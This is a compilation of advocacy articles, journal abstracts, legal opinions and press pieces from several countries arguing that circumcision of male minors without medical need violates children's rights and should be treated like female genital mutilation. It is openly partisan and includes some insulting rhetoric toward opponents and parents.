If there is a medical indication , that is , to protect the health of the child , circumcision [ may ] be [ performed ] ; such intervention is a legitimate and legal , and [ the ] permission [ of ] a parent [ who ] has responsibility for the child 's development [ is ] required or allowed .
If for any reason parents would not [ allow an ] indicated medical intervention , the competent authorities [ may ] determine possible dereliction of duty [ in ] caring for the child and take the necessary measures provided by law .
However , if has medical circumcision the child is [ not ] indicated , but is only [ a ] result of his parents ' beliefs ( religious or otherwise ) , such intervention is no legal basis .
This [ is so ] whether [ or not ] the child is explicitly opposed [ to ] the intervention .
Intervention in the physical integrity of a child solely because of the desire of his legal representatives or guardians , therefore , constitutes an inadmissible interference in his body and is in our opinion the evidence of criminal behavior .
The Patients Rights Act ( Official Gazette. 15/08 ) in [ part ] 26 stipulates that a patient who is capable of making prior free and informed consent is not permitted to [ undergo ] medical procedure or medical care , [ without such consent ] except in cases provided by law .
For children , the Patients ' Rights
Act provides that , generally [ over ] 15 i[s ] the ability to consent , unless the physician , according to [ their ] maturity assess [es ] that it [ i ] s not [ able ] .
A child before the age of 15 but under the law generally is not able to consent , with the doctor in these cases , estimated to be in this position .
The Act specifically provides that a child 's opinion regarding the treatment takes into account the extent possible , if it is able to express an opinion and if [ he ] understand [s ] the significance and consequences .
The Constitution recognizes the right of parents , in accordance with their beliefs , to provide their children with religious and moral education .
...
Guidance on religious education , in our opinion does not include the right of parents [ due ] to mere religious belief [ to ] choose to intervene in the child 's body .
We therefore believe that circumcision , for reasons other than medical , is not permitted and constitutes unlawful interference with the child 's body and thus violates his rights .
... [ P] arents are primarily responsible for the development of children 's health , but also they must in all cases take into account the child 's interest as a guide in decision making .
Also , in deciding their rights [ they ] are limited by the rights of others , in this case , therefore , their children , ... .
The right to religious freedom does not justify interference with the right to physical integrity of another , so we believe that circumcision for non-medical reasons , may only be [ with ] the child 's consent , subject to the conditions provided for by law on patients ' rights , therefore , usually after 15 years of age .

Jewish critics of circumcision becoming more vocal
Over the last hundred years or so , and particularly over the past decade , a remarkably strong movement against circumcision among Jewish people has emerged .
This development may surprise people , but it is a logical development of the modernisation and integration that began in the early nineteenth century , as European Jews were freed from the ghettos and joined the mainstream of modern life .
In the process they naturally questioned many ancient observances and practices .
Such questioning is also an expression of commitment to human rights , going back to the European Enlightenment of the eighteenth century ( the Declaration of the Rights of Man and Citizen ) , strengthened by the Universal Declaration of Human Rights just after the Second World War .
The principles developed here asserted an individual ’s right to freedom , autonomy , and personal rights , of which the most basic was control over his or her own body .
Given their own sad history of discrimination and persecution Jewish people have naturally been at the forefront of campaigns for human rights in many areas other than freedom of religion .
This critical trend also derives from new historical information about the origin of circumcision ( male and female ) in Egypt and Africa , scientific discoveries about the damage caused by circumcision , and a desire on the part of individuals to observe a higher level of spiritual ethics .
This movement to question and often reject circumcision includes Jewish Rabbis , scholars , parents , intellectuals and educators , both in the United States and in Israel itself .
In the United States , especially , Jewish people are so prominent in the general anti-circumcision and child protection movements that the controversy over circumcision is sometimes seen as a debate internal to the Jewish community .
That would be a mistake : human rights are enjoyed by all humans , simply by virtue of their birth .
The Jewish people ’s long experience of , and heroic resistance to , persecution and discrimination has naturally made them particularly sensitive to human rights issues , so it comes as no surprise to see the most thoughtful members of the community having doubts about a practice that is increasingly seen as unconscionable denial of individual autonomy and personal choice - in short , a violation of those same rights that Jewish people invoke when defending their own religious freedom and cultural / personal identity .

Scholar criticises double standard on male and female genital mutilation
In an article published in the scholarly journal Ethnicities , Matthew Johnson criticises the double standard commonly applied to male and female genital cutting and argues that if male circumcision were examined objectively and with the same criteria that are applied to female genital mutilation it would be seen as another “ traditional practice prejudicial to the health of children ” and thus a violation of human rights .
Abstract
For liberals like Martha Nussbaum , Female Genital Mutilation ( FGM ) has come to mark the boundary of toleration .
By impairing physical , sexual and psychological functioning , the likes of Nussbaum believe the non-western practice to fulfil , most clearly , the conditions for proscription according to the harm principle .
However , those same liberals assume the western practice of male circumcision , generally , to be benign or , even , necessary .
As there is seen to be no harm , there is no reason to intervene .
I argue that this assumption is erroneous , highlighting evidence that suggests that , according to the criteria of sexual diminution , pain and coercion employed by liberals to criticize FGM , circumcision can be viewed as a harmful act of Male Genital Mutilation ( MGM ) .
I highlight the qualitative similarities in the harmfulness of FGM and MGM in order to establish in Nussbaum an empirical and , I argue , ethnocentric oversight in which the criteria of harm are inadequately applied to the latter .
I then attempt to identify the obstacles to Nussbaum ’s recognition of this harm , arguing that she is party to culturally constituted beliefs in the medical and sexual necessity of the practice and , importantly , the methodological tenet of gender oppression .
Having attempted to explain obstacles to the recognition of harm , I then consider the possibility that Nussbaum ’s inconsistency is grounded in toleration of religious obligation , arguing that MGM should stimulate certain liberals to reconsider their engagement with theology .
My aim is to enable liberals to overcome , often justifiable , claims of ethnocentricity , in order to develop a consistent approach to harmful cultural practices .

American legal precedent confirms child ’s right to reject circumcision :
The case of Boldt v. Boldt
A long - running legal saga in the United States was finally resolved in late 2009 , when courts in the state of Oregon ruled that a parent could not compel a child over which he had custody to get circumcised against the boy ’s will .
The case is of considerable interest in its potential to limit the power of parents to impose circumcision and similar physical alterations on children and in its implicit recognition that children have their own rights – to physical integrity and freedom of conscience and religion – independently of their parents ’ belief .

Australian inquiries question ethics and legality of non-therapeutic circumcision of minors
Two recent inquiries have highlighted the doubtful status of involuntary circumcision – and all medically unnecessary circumcision of male minors is involuntary because they have not sought the operation and have not given consent .
Human Rights Consultation
The first is a Human Rights Consultation held by the Commonwealth government in April - June , seeking public comment on the Australian human rights framework and suggestions for strengthening it .
Several submission to the Consultation focused on the problem of circumcision of male minors , pointed out that they have no legal protection at all from such surgery , and urged that action be taken to give them greater security .
One of these submissions discussed Australia ’s obligations under international human rights covenants in some detail and argued that the most effective short term reform to reduce the incidence of involuntary circumcision was to delete medically unnecessary circumcision from the Medical Benefits Schedule , thus ensuring that rebates under Medicare were paid only when the surgery was medically necessary .
Read full text of submission here .
Tasmanian Law Reform Institute inquiry
The second inquiry is a paper by the Tasmanian law Reform Institute on the legal status non-therapeutic circumcision of male minors .
By “ non -therapeutic ” the TLRI means any circumcision operation that is not necessary to treat an existing injury , deformity or disease .
Non-therapeutic thus includes prophylactic circumcision – that is , the precautionary amputation of the foreskin in the belief that it will reduce the risk of contracting diseases to which the person may be exposed at some later date .
This is the most common variety of circumcision practised in Australia today .
The TLRI paper suggests that non-therapeutic circumcision of male minors violates agreed principles of human rights and medical ethics and could even be illegal because there was no informed consent from the subject of the operation , and surrogate ( parental ) consent could not be valid unless there was a genuine need for such a radical intervention .
The Sydney Morning Herald reacted with predictable alarm to these suggestions in an illogical editorial that would fail the most basic clear - thinking test , simultaneously admitting that circumcision without the consent of the person being cut was immoral , yet still trying to defend the right of adults to do it to children .
Particularly telling was its admission that criticism of and objections to the practice are as old as the practice itself .
The SMH wants to insinuate that because they are old - hat , such objections should be ignored ; but the real lesson is that if the practice is so controversial and debated there can never have been widespread agreement as to its value or legitimacy .
In the context of such doubt , disagreement and uncertainty the only person with the right to decide whether to have it done is the individual man or boy , girl or woman .
Anything else is coercion .
The SMH editorial and the reply by Paul Mason , Tasmanian Commissioner for Children , follow .
Editorial : Arguments as old as the practice
MORE than a billion men are circumcised and billions more have undergone the ritual over the centuries .
The practice is both ancient and commonplace .
Yet now we are supposed to accept the argument , promoted in some ethical circles , that circumcision is both dangerous and an infringement on the rights of the child .
Any surgical procedure , however minor , is dangerous if performed crudely .
The world is full of risks , with children the most vulnerable .
What matters is proportionality .
A report from the Tasmanian Law Reform Institute , released this week , suggests that , in the absence of specific laws relating to the practice of circumcision , it may be an abuse of the rights of the child .
The report goes so far as to countenance that circumcision itself may , by its very nature , be an act of cruelty , law or no law .
The matter has been given an airing after the Tasmanian Children ’s Commissioner , Paul Mason , sought guidance from the institute for the handling of cases where , for example , a dispute arises over whether a child should be circumcised .
This is a nettlesome legal issue because cultural practice is divided and the law is largely silent .
The cultural direction in Australia is moving away from circumcision .
Western medical organisations no longer recommend routine neonatal circumcision .
What used to be commonplace , involving more than 90 per cent of male infants born in Australia in the 1950s , has become a minority position .
Only about one in seven newborn boys are circumcised .
The majority of circumcisions involve religious customs , largely the rites of Muslims and Jews .
The arguments for and against male circumcision are as old as the practice itself .
In Australia , the procedure has a negligible rate of serious physical injury .
Proponents argue the practice leads to lower rates of infection from sexually transmitted diseases , and has no adverse impact on sexual function .
Opposition has largely come in the form of ethical arguments over the rights of the child being compromised by a procedure performed for no reason other than cultural practice , with the possibility of later psychological injury .
The argument that circumcision involves psychological risks is finding growing support in medical studies .
Common sense suggests that in a dispute between or within families over whether to circumcise , prudence favours leaving the child untouched .
Common sense also suggests that where both parents want their child circumcised there are no compelling medical , legal or ethical grounds for not doing so .
Sydney Morning Herald , 4 June 2009
Comment
The Sydney Morning Herald ’s editorial is quite in accord with its longstanding practice of giving prominent publicity to every half - baked slander against the foreskin that posthephobic toilers in America ’s bloated medical research industry cook up , and ignoring the vast body evidence to the effect that circumcision of minors is a harmful , cruel and unnecessary procedure that violates the rights of the child and is already technically illegal under existing laws of assault , mayhem and molestation – as the Queensland Law Reform Commission found in 1993 .
So long as ignorant editorial writers use their unaccountable power to champion bad habits it is unlikely that there will be any laws to restrict the practice of male genital mutilation , let alone the degree of protection from female genital mutilation afforded to women .
The key facts that refute the editorial ’s concluding pontification are its earlier admissions that circumcision has always been a controversial and contested operation , and on a world scale a minority practice .
These facts alone dictate that the only person entitled to make an irreversible decision about the shape of his penis is its owner .
At least the SMH had the decency to publish Paul Mason ’s letter , pointing out the crazed illogic in the editorial ’s position .
The way some circumcision promoters attempt to argue , you would think it was a large chunk of their brain that had been surgically removed in infancy .
The paper by Tasmanian Law Reform Institute is here
Stopping circumcision a matter of human rights
Your editorial ( “ Arguments as old as the practice ” , June 4 ) misrepresents my input into the Tasmanian Law Reform Institute ’s issues paper on the validity of parental consent to unnecessary circumcision , and reveals a glaring non sequitur .
You conclude that “ there are no compelling medical , legal or ethical reasons for not ” operating on a boy without his informed consent -- but only after observing that “ the law is silent ” ; that circumcision “ may be an act of cruelty ” ; that medical organisations no longer recommend routine circumcision ; that “ the possibility of … psychological risks is finding growing support in medical studies ” ; and that “ prudence favours leaving the child untouched ” .
I did not refer the issue to the institute in connection with cases where a dispute arises whether to circumcise : the law is pretty clear that it will not proceed in those cases .
I referred it in the context that babies are human beings and all human beings have the right to bodily integrity assured by the Universal Declaration of Human Rights ( 1948 ) .
I referred it in the context that the first principle of the Hippocratic Oath is “ Do no harm ” and that the irreversible , invasive and painful removal of any neurologically complex external organ of a powerless patient at the request of a third party is an ethical travesty .
Your editorial seeks to seduce readers into denying babies and children their legal and human rights , while taxpayers are footing the bill through Medicare - circumcision is the only item that requires no medical indication for payment .
One reason for its declining popularity in the West since the 1970s may be the influence of women , who see their babies as perfect and not for cutting : from this perspective unnecessary circumcision is a feminist issue .

Age op - ed writer calls circumcision male genital mutilation
It 's child abuse and it's time it was cut out
by Catherine Deveny
The Age ( Melbourne ) , October 24 , 2007
People give plenty of reasons for circumcising their male children , writes Catherine Deveny .
But most of them do n't amount to anything .
NO ONE seems to be able to explain to me why the circumcision of baby boys is not considered child abuse .
Why in 2007 is it still acceptable for parents to have their babies ' foreskins ripped off ?
How can it be legal , let alone ethical , for any human being to choose for another human being 's body to be irreversibly mutilated ?
No medical reason , no rational thought and in many cases no aesthetic .
Just because .
I suggest that we should ban the use of the term “ circumcision ” and force people to use the term “ genital mutilation ” .
Because that 's what it is .
It 's not “ a personal choice ” , because that person is not making a choice .
It 's human rights abuse .
The We Circumcised For Religious Reasons camp justify genital mutilation citing religion .
They embrace the parts of religious texts that suit them and dismiss the ones that do n't .
And when I say “ they ” , not all of them do .
Many believers
I know have all applied a little rational thought to the equation and just decided not to inflict unnecessary pain on their child or expose them to avoidable risk .
They 've decided to file that bit of the Holy Book under the other things that just do n't fit ; like selling your daughter into slavery or killing your neighbour if they work on the Sabbath .
What kind of God would disapprove of you , stop loving you , or not give you eternal life if you do n't mutilate your child 's genitals ?
That does n't sound like a nice kind of God .
And what caring community would shun you , judge you or ostracise you for not inflicting genital mutilation on your child ?
Then we have the We Circumcised Our Boys So They Look The Same As Their Father camp .
Sure , it 's not fair for me to pick on people less fortunate in the brains department than the rest of us , but when they are subjecting innocent children to genital mutilation I 'm going in swinging .
I 'm not going to bother asking the hard question “ why do you need them to look like their father ? ” , because you cannot reason with something that has not come from reason but from mindlessness .
I ask the So They Look The Same As Their Father camp , why stop there ?
If you want them to look the same as their father , dye their hair , have them undergo cosmetic surgery and if the father has any tattoos or facial hair , sort that out too .
Related to this camp is the We Circumcised Our Boys Because A Circumcised Penis Looks Nicer camp .
We are talking the shallow end of the intelligence pool here .
How would they feel if they had had their nipples , nose or ears cut off by their parents when they were a child because their parents thought “ it looked nicer ” ?
I must say that I do applaud these two camps on their frankness and honesty despite it revealing their stunning stupidity .
After all , they could do what others do and make the decision for no rational reason and then rationalise it by joining the We Circumcised Our Boys For Health And Hygiene Despite Looking Closely At The Research camp .
I have read the various studies suggesting that circumcision may reduce the spread of HIV and cervical cancer .
I have also read the studies disproving the circumcision - reduces - infection myth .
Here in Australia , all of these risks can be effectively and safely managed with condoms and cleanliness .
That 's right , a bit of frangers and face washers , rubbers and rubbing .
Why would you expose a child to an unnecessary medical procedure and all the risks that come with it when you could teach them how to clean themselves and use a condom ?
Because you can , I suppose .
By the same logic , removing all your children 's teeth would prevent them getting fillings .
Unless , of course , there is a sound medical reason to circumcise .
And when I say sound , I mean sound as in last resort .
I do n't mean that you walk into a GP with a seven - year - old with a constricted foreskin that is not retracting and walk out with a referral to a surgeon to have your child 's genitals mutilated , as a family I know could have .
One of their sons had that very problem .
They were offered a referral to a surgeon to have him circumcised .
They did n't like the sound of that .
Luckily they did n't have private health insurance , because that meant that they were given a referral to the Royal Children 's Hospital , where they saw a general pediatric surgeon , or as their son referred to her , a Dick Doctor .
Yes , she said , he could be circumcised , but she was having great success using an ointment available over the counter from the chemist .
Three days later , the boy had a retracting foreskin .
And two years later , he still does .
The wonders of a health service on a budget as opposed to a private business .
So if he wants to get himself circumcised as an adult , that 's his choice .
And he 'll have that choice .
Because when you circumcise someone , you can't uncircumcise them .
Circumcision of male children " a hidden human rights violation "
In the April 2007 issue of the Australian Journal of Human Rights , Ranipal Narulla argues that circumcision of male minors should be recognised as a violation of human rights
Synopsis
Male circumcision is an accepted practice within Australian society , despite the fact that female circumcision is widely reviled in the Western developed world .
This article will consider why society and the law treat circumcision of males and female differently .
Analysis will focus upon the circumcision of male children in Australia , with reference to the United Kingdom and the United States of America .
The similar social history of the practice within these jurisdictions is instructive when critically analysing the Australian context .
The discussion will encompass the circumcision of all male children , as the issues of lack of consent and the imposition of a parent 's religious and cultural norms upon the child are consistent for all minors , with specific focus on neonatal children where such extreme youth creates additional vulnerability .
The absence of domestic law in Australia dealing with the circumcision of male children invites analysis of the protection afforded under international human rights instruments to which Australia is legally bound .
This article deconstructs the medical myths that surround the circumcision of male children , and in so doing makes a strong argument for the need to recognise circumcision of male minors as a human rights violation .

Male and female circumcision not so different
An article in a leading international journal , the Medical Anthropology Quarterly , questions the “ quarantining ” of male circumcision from female genital mutilation and calls for both less gender discrimination and more respect for the rights of boys .
Abstract
This paper offers a critical examination of the tendency to segregate discussion of surgical alterations to the male and female genitals into separate compartments - the first known as circumcision , the second as genital mutilation .
It is argued that this fundamental problem of definition underlies the considerable controversy surrounding these procedures when carried out on minors , and that it hinders objective discussion of the alleged benefits , harms and risks .
The variable effects of male and female genital surgeries are explored , and a scale of damage for male circumcision to complement the World Health Organization 's categorisation of female genital mutilation is proposed .
The origins of the double standard identified are placed in historical perspective , and a brief conclusion makes a plea for greater gender neutrality in the approach to this contentious issue .

Bundaberg circumcision scandal demonstrates vulnerability of boys and need for protection
In Australia it is evident that boys are in far greater need of protection from genital mutilation than girls .
On a world scale it has been estimated that some 13 million boys are circumcised each year , compared with only two million girls subjected to FGM .
Societies that circumcise girls are found in Africa , the Middle East and parts of south - east Asia , but the practice is all but unknown elsewhere , except among immigrants from these regions .
It might be argued that the laws against FGM that have been passed in many western countries are aimed at a problem that scarcely exists .
In Australia , as in the United States , however , thousands of boys annually are the victims of circumcision procedures , the vast majority of which are not required for any health reason and are certainly not desired by the child .
Nor is there any reason to think that such a procedure in his best interests , neither short nor long term .
As an example of how vulnerable boys are , the Tasmanian Issues Paper describes a case in Bundaberg in 2002 , when an estranged father who had been denied custody of the two boys ( aged 5 and 9 ) from his former marriage took advantage of a regular visit to race the boys off to a surgeon and have them circumcised .
Although the frantic mother made efforts to have him prosecuted , he was let off without even a slap on the wrist .
The boys were traumatized and bitter .
Even more shameful than the father ’s conduct was that of the surgeon , who made no attempt to consult the views of the mother , the feelings of his two terrified and unwilling “ patients ” , or even if the father was entitled to authorise the operation ( which he was not ) .
There was a half - hearted attempt to prosecute the father , but there would have been better grounds for prosecuting the surgeon , who acted without the informed consent of a person with the authority to give that consent .
In this case the father ’s motivation arose from his Turkish - Islamic background , but it could just as easily have been a young mother who had been alarmed by scaremongering assertions on talk - back radio , or the advertising of “ circumcision specialists ” , or urban legends about the dreadful fate awaiting boys whose foreskins were not snipped off before it was too late , such as getting caught in their zipper , becoming infected , ultimately succumbing to gangrene and causing the boy ’s death ( as Brian Morris solemnly warns parents in his pamphlet , In Favour of Circumcision ) .

Male and female circumcision in Australia : Legal and ethical issues
Female circumcision ( the removal of any part of the female genitals ) is legally prohibited , and is in fact a criminal offence , in New South Wales , Victoria , South Australia and the Australian Capital Territory .
It is a practice rejected and abhorred by people all over Australia .
Despite this , widespread circumcision of male infants and boys arouses few protests and continues to be unregulated .
In 1993 the Queensland Law Reform Commission concluded in their research paper , Circumcision of Male Infants :
" On a strict interpretation of the assault provisions of the Queensland Criminal Code , routine circumcision of a male infant could be regarded as a criminal act .
Further , consent by parents to the procedure being performed may be invalid in light of the common law 's restrictions on the ability of parents to consent to the non-therapeutic treatment of children . "
The full text of the report is available here
For further information on the legal position of male and female circumcision in Australia is available at
http://www.cirp.org/library/legal/Australia/
In an article in the Australian Journal of Law and Medicine Christine Mason criticised the double standard by which the circumcision of girls and women is prohibited or discouraged while the circumcision of male infants and boys is permitted with little regulation and even advocated .
She points out that the World Health Organisation used to employ the term female circumcision but introduced the expression female genital mutilation ( FGM ) at a conference in Ethiopia in 1990 , supposedly because it carried " heavier moral weight " - though it may be suspected that another reason was to demarcate it from male circumcision , which the WHO did not propose to combat .
( Ethiopians practise both male and female genital mutilation . )
Mason has a useful discussion of the different procedures which may be covered by the term FGM .
She also points out that , in contrast to the way in which the adverse impact of male circumcision is usually underestimated and trivialised , most people overestimate and exaggerate the harm done by female circumcision .
Although it is very damaging to sexual function and often carries additional adverse side - effects , it is not true that circumcised women necessarily become incapable of sexual sensation or pleasure , and it seems that many are still capable of orgasm .
The article emphasises that consent is the central concept in all surgical treatments , since " all medical treatment is preceded by the patient 's choice to undergo it " ; without consent , even the least touching amounts to the tort of battery .
Legal cases have established that the rights of parents to impose medical procedures on children decline as the children get older , and further that children ( even if intellectually disabled ) have the right to provide informed consent to treatment .
If a procedure is not medically required , ( Marion 's case , 1992 ) has established that circumcision may not be performed without the approval of the Family Court .
In relation to male circumcision , Mason points out : " Since a child cannot be consulted and the process is painful and unnecessary at birth , such decisions should only be made by an adult male .
As with adult female surgery , an adult male in full possession of his senses should be able voluntarily to elect to be circumcised " .
She quotes another legal authority , who states : " It is illogical that male circumcision has not been considered with the [ female genital mutilation ] prohibition .
Surgical cutting and disfiguring of a healthy genital organ is consistent with male and female circumcision .
… [ Since ] the differences appear to be based largely on socially constructed ideals , and not on facts , it is suggested there should be no distinction based purely on gender " .
( David Richards , " Male circumcision : Medical or ritual ? " , Journal of Law and Medicine , Vol. 3 , 1996 , p. 372 )
Mason concludes that tolerance of male circumcision makes it much harder to eliminate and actually encourages female circumcision , and she quotes one activist as stating : " Female circumcision will never stop so long as male circumcision is going on .
How do you expect to convince an African father to leave his daughter uncircumcised as long as you let him do it to his son ? "
It is hypocritical and counter - productive for the USA to urge African and Islamic cultures to eliminate female circumcision while American doctors continue to enforce the mass circumcision of male babies .
She concludes : " Changes are required to educate against both male and female infant genital surgery whilst also amending the existing legislation in order to permit adult consent to such procedures .
This both protects children and allows freedom of minority practices when a person is old enough to voluntarily and freely decide for himself or herself .
In the long term , it may even lead to the eradication of the practice altogether . "

Britain : Circumcision of minors unethical unless there is pressing medical necessity
The British Medical Association ( BMA ) has revised their 2003 Guidance on the Law and Ethics of Male Circumcision .
The revised guidance dated June 2006 and reissued on 12 November 2007 reaffirms the statement “ to circumcise for therapeutic reasons where medical research has shown other techniques to be at least as effective and less invasive would be unethical and inappropriate ” .
The guidance confirms that there is rarely any clinical need for circumcision : “ normal anatomical and physiological characteristics of the infant foreskin have in the past been misinterpreted as being abnormal .
The British Association of Paediatric Surgeons advises that there is rarely a clinical indication for circumcision .
Doctors should be aware of this and reassure parents accordingly ” .
The most significant revision in the new guidance is in respect of the legal situation .
The guidance states that , if it was shown that circumcision where there is no clinical need is prejudicial to a child ’s health and wellbeing , it is likely that a legal challenge on human rights grounds would be successful .
The guidance further states that , if damage to health were proven , there may be obligations on the state to proscribe it .
The UN Convention on the Rights of the Child , which has been ratified by the UK , requires ratifying states to “ take all effective and appropriate measures with a view to abolishing traditional practices prejudicial to the health of children ” .

Victims of unwanted circumcision " entitled to compensation "
Speaking on the BBC on 11 November 2005 , the Chair of the British Medical Association Medical Ethics Committee , Dr Michael Wilkes , said that men who resented having been circumcised as children were entitled to compensation .
Interviewer : I 'm here at the British Medical Association to ask Dr. Michael Wilkes about circumcision and in particular whether it's true that unnecessary circumcisions are being carried out .
Dr. Wilkes :
There is hardly a reason to circumcise a little boy for medical reasons because those medical reasons do n't exist .
We do accept as a by definition of medical reasons and benefit medically that comes from that , that the Jewish Faith have a strong tradition and therefore a strong claim to continue this practice .
Interviewer : Medically what reason would there be to circumcise either a youngster or an older person .
Dr. Wilkes :
The vast majority of cases for instance of non retractile foreskin , which is a developmental thing , it just takes time , sometimes for the tissue between the foreskin and the glans of the penis , the sensitive part of the penis , to break down so the foreskin can be put back .
It 's often a question either of time or of very gentle manipulation , certainly not surgery .
Interviewer :
So the people of NORM UK that feel that as if they 've been circumcised for the wrong reasons – in the past do you think doctors have circumcised for no good reason maybe .
Dr. Wilkes :
Yes I do , I do , and I suspect that some people from NORM UK , those who are not members of the strong Jewish tradition for instance or maybe slightly less persuasive that – certainly in Muslim tradition – the majority of people who have been circumcised in the past for what was put to them or put to their parents as good medical reasons were probably no such thing and those people certainly have a right to make a claim that what was done to them was an unnecessary and premature intervention at a time when they had no capacity or say in the matter .

Legal scholars question ethics and legality of circumcision of minors
In two articles in recent issues of major international journals covering medical ethics and human rights , two British legal experts have questioned the ethics of circumcising male infants , comparing it to female genital mutilation , and have even thrown doubt in whether any such surgery on an individual without his or her consent can be regarded as legal .
Abstracts of the two articles , in the Journal of Medical Ethics and the International Journal of Children 's Rights , are given below .
1. " A covenant with the status quo ? "
This article offers a critique of the recently revised BMA guidance on routine neonatal male circumcision and seeks to challenge the assumptions underpinning the guidance which construe this procedure as a matter of parental choice .
Our aim is to problematise continued professional willingness to tolerate the non-therapeutic , non-consensual excision of healthy tissue , arguing that in this context both professional guidance and law are uncharacteristically tolerant of risks inflicted on young children , given the absence of clear medical benefits .
By interrogating historical medical explanations for this practice , which continue to surface in contemporary justifications of non-consensual male circumcision , we demonstrate how circumcision has long existed as a procedure in need of a justification .
We conclude that it is ethically inappropriate to subject children – male or female – to the acknowledged risks of circumcision and contend that there is no compelling legal authority for the common view that male circumcision is lawful .

The Law and Ethics of Male Circumcision
Routine neonatal male circumcision has generally failed to excite medico - legal attention .
Notwithstanding recent debates in the ethical literature , notably in special issues or symposia in the Journal of Medical Ethics ( 2004 , 30 ) and American Journal of Bioethics ( 2003 , 3 ) , the law has yet to engage seriously with this issue .
In a forthcoming contribution to an emerging medico - legal debate we have suggested that neglect of this issue is partly attributable to the way in which routine infant male circumcision ( and its attendant effects and risks ) is typically characterised in opposition to female circumcision for rhetorical and political reasons ( Fox and Thomson , 2005 ) .
The result is that , while female circumcision is constructed as morally and legally unacceptable within a civilised society , male circumcision is characterised as a standard and benign medical practice .
In this article our focus turns to the related failure to engage in a full cost / benefit analysis of the practice and the harm it causes to boy children .

Male circumcision and female genital mutilation : Problems of definition
Scandinavian authorities seek stricter regulation of circumcision to protect boys
In Scandinavian and European countries circumcision was never practised ( except in medical emergencies ) and was all but unknown until recent times , when significant numbers of immigrants from the Middle East and Africa ( mainly Muslims ) arrived , and wished to maintain traditional customs - particularly their traditional ways of circumcising their sons and daughters .
They expected local doctors to perform the procedures for them .
This posed a severe ethical dilemma for both the medical profession and law - makers , for two reasons .
First , there was the danger that if the doctors refused such requests , parents would exercise a kind of blackmail by getting their boys and girls circumcised by unskilled ethnic operators on the proverbial kitchen table , where there was high risk of additional injury , infection and severe harm .
Secondly , there was a problem for the principle of equal treatment on the basis of sex .
Most European countries had passed laws making any form of female genital mutilation illegal , but although they also had laws and treaties that were supposed to prevent discrimination on the basis of sex , none had passed any laws covering circumcision of males .
Unlike girls , boys were completely unprotected .
The response from Scandinavian medical authorities was to seek stricter regulation of circumcision .
Many doctors would have preferred to see circumcision of boys banned outright until the age of consent ( 16 or 18 ) , but they recognised that this would pose problems for devout Jewish parents , who traditionally perform circumcision ( of boys only ) on the eighth day .
They have therefore compromised by setting stricter standards and procedures for the surgery , while continuing to deplore the practice of both male and female genital cutting as a serious violation of the rights of the individual and of medical ethics .
Norway : Medical authorities criticise ritual circumcision and urge its abandonment
The following article by Pal Gulbrandsen appeared in Tidsskrift for den Norske laegeforening [ Norway ] , Volume 121 , Number 25 : Page 2994 , [ Journal of the Norwegian Medical Association , Volume 121 Number 25 : Page 2994 . ]
Ritual circumcision of boys
The Council for Medical Ethics states that ritual circumcision of boys is not consistent with important principles of medical ethics , that it is without medical value , and should not be paid for with public funds .
The council has sent a statement to the board of the Norwegian Medical Association on this matter .
Among other things , the council says that ritual circumcision of boys has no established medical benefit .
Even with the use of local anaesthesia , the procedure causes pain and is associated with certain risks of medical complications .
The Council for Medical Ethics states that circumcision of boys is not consistent with important principles of medical ethics laid down as general determinations in Paragraph 1 ( 1 ) of the Norwegian Code of Ethics for Doctors .
These require doctors to uphold human health , and to cure , relieve and comfort .
The council points out that it is an important factor that the child cannot give consent .
According to the council , doctors should be allowed to refuse to perform ritual circumcision as a matter of conscience .
The council makes a point of noting that , when performed , even if not for medical reasons , that circumcision is a surgical operation that must be carried out according to correct principles of surgery and with proper anaesthesia .
In line with the Code of Ethics for Doctors 12 , it should not be paid for by the public health service .
The council invited relevant religious leaders in our community to work on replacing circumcision with symbolic rituals that do not involve a surgical procedure .

Finland : Child protection agencies call circumcision of minors unethical
Central Union for Child Welfare , Helsinki , Finland
Statement on male circumcision
30 September 2003
Submission to the Task Force convened by the Ministry of Social Affairs and Health to inquire into the regulation of male circumcision .
The Central Union for Child Welfare in Finland opposes the circumcision of boys except when necessary to treat a disease .
Circumcision violates a boy 's sexual integrity and alters his body , having physical and behavioural effects .
Female circumcision is rightly viewed as inhumane sexual mutilation and is punished as an assault .
Boys are guaranteed the same legal protection .
The Central Union for Child Welfare considers that the bodily integrity of minors should not be violated by circumcision except when medically necessary to treat a disease .
The actions of society should be based on unconditional respect for the physical integrity of minors .
That is why the Central Union for Child Welfare considers that no one has the right to consent to this invasive operation on a child 's behalf , except in relation to treatment of a disease .
The Central Union for Child Welfare believes children have a right to special protection .
The Child Custody and Right of Access Act prohibits the subjection of children to exploitation and humiliating treatment .
The Constitution guarantees physical integrity .
The Constitution 's preparatory work explicitly establishes that religious freedom does not extend to violating the integrity of another person .
Thus a child should be treated as an individual who is completely protected from birth until the age of majority .
Deliberately causing pain and injury is defined in the Penal Code as maltreatment and is subject to prosecution .
The Convention on the Rights of the Child , ratified by Finland , demands that states parties undertake to abolish traditions harmful to children .
The Council of Europe Convention on Human Rights and Biomedicine , to which Finland is a signatory and which Finland is preparing to ratify , prohibits giving consent to an intervention on behalf of an incapable person , unless it is for the direct benefit of that person .
The position of the Central Union for Child Welfare is that boyhood circumcision should not be permitted .
The Union hopes that the task force of the Ministry of Social Affairs and Health will discuss methods to bring about cultural changes that protect children 's physical integrity and lead to an end to circumcision .
Circumcision should be permitted only on individuals who are of age , regardless of whether they are male or female , and only after determining they have consented freely , without coercion .

Danish authorities question legality of circumcision
Articles in Danish magazine Politiken compare male circumcision to female genital mutilation and call for a ban on circumcision of boys .
They should have the same protection from unnecessary genital alterations as girls .
Article by Uffe Hastrup , 20 November 2002
Article by Lau Sander Esbensen
The Chairman of Danish Council of Medical Ethics has called for ban on circumcision of boys before the age of consent ; he states that " no adult is entitled to carry out irreversible surgery on a child , unless it is for health reasons " ; and that " prior to eighteen years of age , Danish children have a right to be protected from ritual interventions which can cause pain or permanent damage " .

Canada : Medical authorities call circumcision of minors a human rights violation
In their policy on circumcision realeased in July 2004 , the College of Physicians and Surgeons of the Canadian province of British Columbia called circumcision both unnecessary and a mutilation .
Doctors Fear Circumcision Violates Human Rights :
B.C. MDs ' governing body says many consider the procedure " unwarranted mutilating surgery "
New British Columbia doctors ' guidelines that suggest circumcising male babies may be a human - rights abuse could put a chill on doctors who perform the surgery .
" Routine infant male circumcision is an unnecessary and irreversible procedure , " say the B.C. College of Physicians and Surgeons guidelines . "
Therefore , many consider it to be unwarranted mutilating surgery .
" Many adult men are increasingly concerned about whether their parents had the right to give consent for infant male circumcision . "
The guidelines refer to an infant 's Charter and United Nations rights to security of person and bodily integrity .
" Most physicians reading this are going to feel a certain degree of apprehension about doing or continuing to do circumcisions , " said Vancouver pediatrician Dr. David Smith .
